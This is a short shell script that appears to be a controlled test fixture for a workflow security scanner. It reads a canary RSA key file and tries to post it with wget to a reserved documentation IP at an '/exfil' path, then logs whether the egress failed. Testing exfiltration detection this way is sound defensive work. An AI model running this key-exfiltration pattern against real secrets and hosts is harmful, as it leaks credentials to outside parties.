#!/bin/sh
set -eu

# ref: /home/mrg/Desktop/exfil-step-a-refs/vet/.github/vet/policy.yml:37 (Dangerous-Workflow signal; controlled egress fixture)
payload="$(cat /canary/canary_rsa)"
echo "EXFIL_SAMPLE name=malicious-direct canary_read=1 egress_attempt=1 egress_actor=self"

if wget -T 3 -q -O - --post-data "$payload" http://198.51.100.10/exfil; then
  echo "EXFIL_SAMPLE name=malicious-direct egress_result=unexpected_success"
else
  echo "EXFIL_SAMPLE name=malicious-direct egress_result=failed_expected"
fi
